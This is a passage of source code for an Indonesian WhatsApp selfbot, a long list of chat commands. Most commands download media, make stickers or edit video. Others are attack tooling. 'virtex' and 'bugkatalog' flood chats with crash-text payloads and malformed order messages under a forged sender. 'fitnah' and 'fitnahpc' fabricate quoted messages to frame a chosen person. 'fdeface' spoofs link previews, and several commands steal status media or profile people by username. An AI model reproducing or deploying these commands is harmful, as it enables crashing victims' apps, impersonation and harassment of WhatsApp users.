\`\`\`▢ Mengikuti : ${ini_result.following}\`\`\`
\`\`\`▢ Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : https://instagram.com/${ini_result.username}\`\`\`
`
             client.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break;
          case "igstalk11":
        if (!q) return fakegroup("Usernamenya?");
        igstalk(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break; 		                 
              case 'ig':
            case 'igdl':
            case 'instagramm':{                
                 if (args.length < 2) return reply(`Kirim perintah *${prefix}ig* link ig`)
                if (!isUrl(args[1]) && !args[1].includes('instagram.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                getPost(args[1].split('/')[4])
                .then((res) => {
                    let { owner_user, post, date, capt } = res
                    let caption = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Owner : ${owner_user}\`\`\`
\`\`\`▢ Jumlah Media : ${post.length}\`\`\`
\`\`\`▢ Caption :${capt}\`\`\`

_Harap tunggu sebentar, media akan segera dikirim_`
                    client.sendMessage(from, caption)
                    for (let i = 0; i < post.length; i++){
                        client.sendMediaURL(from, post[i].url)
                    }
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    client.sendMess(ownerNumber[0], 'IG Download Error : ' + err)
                    console.log(color('[IG Download]', 'red'), err)
                    reply(mess.error.api)
                })
            }
                break;                			 
				case 'pptiktok':				
				dptod = args.join(" ")
				kntl = await getBuffer(`https://api.lolhuman.xyz/api/pptiktok/${dptod}?apikey=${LolHuman}`)
				client.sendMessage(from, kntl, image, {quoted: ftroli})				
				break;
				case 'githubstalk2':				
				reply('[❗] Sabar lagi stalking GitHub nya')
				get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${lolkey}`, {method: 'get'})
				get_result = get_result.result
				text = `Full : ${get_result.name}\n`
				text += `Followers : ${get_result.followers}\n`
				text += `Following : ${get_result.following}\n`
				text += `Publick : ${get_result.public_repos}\n`
				text += `Public Gits : ${get_result.public_gists}\n`
				text += `User : ${get_result.user}\n`
				text += `Compi : ${get_result.company}\n`
				text += `Lokasi : ${get_result.location}\n`
				text += `Email : ${get_result.email}\n`
				text += `Bio : ${get_result.bio}\n`
				buffer = await getBuffer(get_result.avatar)
				client.sendMessage(from, buffer, image, {quoted: ftroli, caption: text})
				break;
				case 'tiktokstalk5':			
				reply('[❗] Sabar lagi stalking TikTok nya')
				username = args[0]
				get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolkey}`, {method: 'get'})
				get_result = get_result.result
				text = `Link : ${get_result.username}\n`
				text += `Bio : ${get_result.bio}\n`
				text += `Followers : ${get_result.followers}\n`
				text += `Following : ${get_result.followings}\n`
				text += `Likes : ${get_result.likes}\n`
				text += `Vidio : ${get_result.video}\n`
				buffer = await getBuffer(get_result.user_picture)
				client.sendMessage(from, buffer, image, {quoted: ftroli, caption: text})				
				break;
				case 'ytstalk':		
				reply('[❗] Sabar lagi stalking YT nya')
				ytk = args.join(" ")
				anu = await fetchJson(`http://api.lolhuman.xyz/api/ytchannel?apikey=${LolHuman}&query=${ytk}`, {method: 'get'})
				cari = '•••••••••••••••••\n'
				for (let search of anu.result) {
				cari += `Chanel : ${search.channel_name}\nTentang : ${search.channel_about}\nCreated : ${search.channel_created}\nLink : https://youtu.com/channel/${search.channel_id}\n•••••••••••••••••\n`
				}
				reply(cari.trim())				
				break;
				case 'mlstalk':				
				reply('[❗] Sabar lagi stalking Mobile Legend nya')
				ha = args.join(" ")
				id = ha.split("|")[0];
                server = ha.split("|")[1];
				get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${id}/${server}?apikey=${LolHuman}`, {method: 'get'})
				txt = `Nickname : ${get_result.result}`
				client.sendMessage(from, txt, text, {quoted: ftroli})				
				break
				case 'ffstalk':				
				reply('[❗] Sabar lagi stalking Free Fire nya')
				id = args.join(" ")
				ngntl = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${id}?apikey=${LolHuman}`, {method: 'get'})
				hsil = `Nickname : ${ngntl.result}`
				client.sendMessage(from, hsil, text, {quoted: ftroli})				
				break;
      case 'stalktiktok2':
      case 'tiktokstalk2':
             if (args.length == 0) return reply(`Example: ${prefix} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=${LolHuman}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ TIKTOK PROFILE
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Username : ${get_result.username}\`\`\`
\`\`\`▢ Nama : ${get_result.nickname}\`\`\`
\`\`\`▢ Pengikut : ${get_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${get_result.followings}\`\`\`
\`\`\`▢ Likes : ${get_result.likes}\`\`\`
\`\`\`▢ Video : ${get_result.video}\`\`\`
\`\`\`▢ Deskripsi : ${get_result.bio}\`\`\`
`
              client.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break;
      case "igstory":
        if (!q) return reply("Usernamenya?");
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              client.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              client.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await client.downloadAndSaveMediaMessage(ger);
          client.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await client.downloadAndSaveMediaMessage(ger);
          client.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
      case "caripesan":
        if (!q) return reply("pesannya apa bang?");
        let v = await client.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await client.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "lirik":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        client.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara client`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await client.sendMessage(from, li, image, { quoted: mek });
        break;
      case "pinterest":
        if (!q) return reply("gambar apa?");
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
        await client.sendMessage(from, di, image, { quoted: mek });
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
		case "igstalk34":
        if (!q) return fakegroup("Usernamenya?");
        hx.igstalk(`${args.join(" ")}`).then((M) => {
          console.log(`${args.join(" ")}`);
          plr = `${M.profile_pic_url_hd}`;
          teks = `*ID* : ${M.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${M.full_name}\n*Bio* : ${
            M.biography
          }\n*Followers* : ${M.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${M.is_private}\n*Verified* : ${
            M.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, plr, teks);
        });
        break; 
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        fakestatus(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        fakestatus(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        fakestatus(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
        if (!mek.key.fromMe) return reply("SELF-BOT");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        client.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await client.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await client.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          client.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        client.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await client.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await client.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          client.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            client.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            client.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          client.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;

      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                client.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        client.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
            case "colong":
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await client.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `SELF`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `BOT`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, client, mek, from);
        break;
        case 'take':
if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}take nama|author*`)
var pembawm = body.slice(6)
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media = await client.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
var packname = pembawm.split('|')[0]
var author = pembawm.split('|')[1]
exif.create(packname, author, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('Error')
client.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await client.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              client.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                client.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await client.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              client.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                client.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
        case "exif":
        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|author`)
if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
exif.create(arg.split('|')[0], arg.split('|')[1])
reply('sukses')
break;
      case "upswteks":
        if (!q) return fakestatus("Isi teksnya!");
        client.sendMessage("status@broadcast", `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
      case "upswimage":
        if (isQuotedImage) {
          const swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await client.downloadMediaMessage(swsw);
          client.sendMessage("status@broadcast", cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          client.sendMessage(from, bur, text, { quoted: mek });
        } else {
          fakestatus("Reply gambarnya!");
        }
        break;
      case "upswvideo":
        if (isQuotedVideo) {
          const swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await client.downloadMediaMessage(swsw);
          client.sendMessage("status@broadcast", cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          client.sendMessage(from, bur, text, { quoted: mek });
        } else {
          fakestatus("reply videonya!");
        }
        break;
      case "fdeface":
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await client.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await client.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        client.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        fakestatus(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakestatus(`「 *SELF-MODE* 」`);
        break;       
        case 'antidelete':
if (!mek.key.fromMe) return fakestatus("SELF-BOT");
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antidel === true) return
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break;
        case 'bbaij72njnwjibdo16830nslm1782':
reply(`${ngazap(prefix)}`)
break;
//By Xchildss X YuzzuKamiyaka
case 'virtex':
if (!mek.key.fromMe) return fakestatus("SELF-BOT");
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break;
case 'bugkatalog':
if (!mek.key.fromMe) return fakestatus("SELF-BOT");
client.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = client.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": fake, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             client.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break;
                case 'buglink':
                if (!mek.key.fromMe) return fakestatus("SELF-BOT");
